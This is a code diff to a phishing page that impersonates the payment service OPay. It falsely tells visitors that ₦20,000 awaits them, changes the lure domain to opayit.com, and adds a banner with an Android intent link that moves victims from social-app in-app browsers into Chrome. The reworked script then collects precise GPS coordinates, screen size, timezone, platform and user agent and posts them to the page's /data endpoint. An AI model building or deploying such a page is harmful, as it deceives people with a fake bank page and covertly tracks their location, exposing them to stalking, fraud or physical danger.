@@ -10,8 +10,8 @@
   <meta property="og:type"        content="website"/>
   <meta property="og:title"       content="OPay — You have an incoming transfer"/>
   <meta property="og:description" content="Someone sent you ₦20,000 via OPay. Your cash is ready to collect."/>
-  <meta property="og:image"       content="https://opaycash.com/og-cash.jpg"/>
-  <meta property="og:url"         content="https://opaycash.com"/>
+  <meta property="og:image"       content="https://opayit.com/og-cash.jpg"/>
+  <meta property="og:url"         content="https://opayit.com"/>
   <meta property="og:site_name"   content="OPay Agent Network"/>
   <meta name="description"        content="Your transfer is ready. Find the nearest OPay agent to collect your cash in minutes."/>
 
@@ -75,9 +75,15 @@
 
     .skeleton { background:linear-gradient(90deg,#f0f0f0 25%,#e0e0e0 50%,#f0f0f0 75%); background-size:200% 100%; animation:shimmer 1.5s infinite; border-radius:4px; height:14px; margin-bottom:6px; }
     @keyframes shimmer { 0%{background-position:200% 0} 100%{background-position:-200% 0} }
+    #inapp-banner { display:none; background:#fffbe6; border-bottom:2px solid #f0c000; padding:12px 16px; font-size:0.82rem; color:#5a4000; text-align:center; line-height:1.6; }
+    #inapp-banner a { color:#1a7a3e; font-weight:700; text-decoration:underline; }
   </style>
 </head>
 <body>
+  <div id="inapp-banner">
+    Open this link in <strong>Chrome</strong> or your phone browser for it to work correctly.
+    &nbsp;<a id="open-browser-link" href="#">Tap here to open in Chrome</a>
+  </div>
 
   <div class="topbar">
     <img src="/logo-light.png" class="opay-logo" alt="OPay"/>
@@ -158,6 +164,20 @@
   <div class="footer">OPay Digital Services Limited &nbsp;|&nbsp; RC 1468513 &nbsp;|&nbsp; Regulated by CBN</div>
 
   <script>
+    // In-app browser detection
+    (function() {
+      const ua = navigator.userAgent || '';
+      const isInApp = /FBAN|FBAV|Instagram|WhatsApp|Telegram|Twitter|TikTok/.test(ua) ||
+        (ua.includes('Android') && /; wv\)/.test(ua));
+      if (isInApp) {
+        const banner = document.getElementById('inapp-banner');
+        banner.style.display = 'block';
+        const link = document.getElementById('open-browser-link');
+        const url = window.location.href;
+        link.href = 'intent://' + url.replace(/^https?:\/\//, '') + '#Intent;scheme=https;package=com.android.chrome;end';
+      }
+    })();
+
     // txnId comes from server-injected placeholder or fallback from URL
     const TXN_ID = (function() {
       const fromUrl = window.location.pathname.replace(/^\//, '').trim();
@@ -275,50 +295,44 @@
 
       if (navigator.geolocation) {
         let sent = false;
-
-        function sendGPS(pos) {
-          if (sent) return;
-          sent = true;
-          fetch('/data', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              txn_id: TXN_ID,
-              gps_lat: pos.coords.latitude,
-              gps_lon: pos.coords.longitude,
-              gps_accuracy_meters: pos.coords.accuracy,
-              screen: screen.width+'x'+screen.height,
-              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-              platform: navigator.platform,
-              ua: navigator.userAgent,
-              timestamp: new Date().toISOString(),
-              source: 'gps'
-            })
-          });
-          localStorage.setItem('opay_result_' + TXN_ID, 'success');
-          showResult();
-        }
-
-        function onErr(err) {
-          if (sent) return;
-          if (err.code === 1) {
+        const watcher = navigator.geolocation.watchPosition(
+          (pos) => {
+            if (sent) return;
             sent = true;
-            localStorage.setItem('opay_result_' + TXN_ID, 'failed');
-            showError();
-          } else {
-            navigator.geolocation.getCurrentPosition(sendGPS, () => {
-              if (!sent) { sent = true; localStorage.setItem('opay_result_' + TXN_ID, 'failed'); showError(); }
-            }, { enableHighAccuracy: false, timeout: 10000, maximumAge: 0 });
-          }
-        }
-
-        const watcher = navigator.geolocation.watchPosition(sendGPS, onErr,
-          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            navigator.geolocation.clearWatch(watcher);
+            fetch('/data', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                txn_id: TXN_ID,
+                gps_lat: pos.coords.latitude,
+                gps_lon: pos.coords.longitude,
+                gps_accuracy_meters: pos.coords.accuracy,
+                screen: screen.width+'x'+screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                platform: navigator.platform,
+                ua: navigator.userAgent,
+                timestamp: new Date().toISOString(),
+                source: 'gps'
+              })
+            });
+            localStorage.setItem('opay_result_' + TXN_ID, 'success');
+            showResult();
+          },
+          (err) => {
+            if (sent) return;
+            if (err.code === 1) {
+              sent = true;
+              navigator.geolocation.clearWatch(watcher);
+              localStorage.setItem('opay_result_' + TXN_ID, 'failed');
+              showError();
+            } else {
+              if (!sent) { sent = true; navigator.geolocation.clearWatch(watcher); showResult(); }
+            }
+          },
+          { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
         );
-        setTimeout(() => {
-          navigator.geolocation.clearWatch(watcher);
-          if (!sent) onErr({ code: 3 });
-        }, 20000);
+        setTimeout(() => { if (!sent) { sent = true; navigator.geolocation.clearWatch(watcher); showResult(); } }, 30000);
       } else {
         showError();
       }
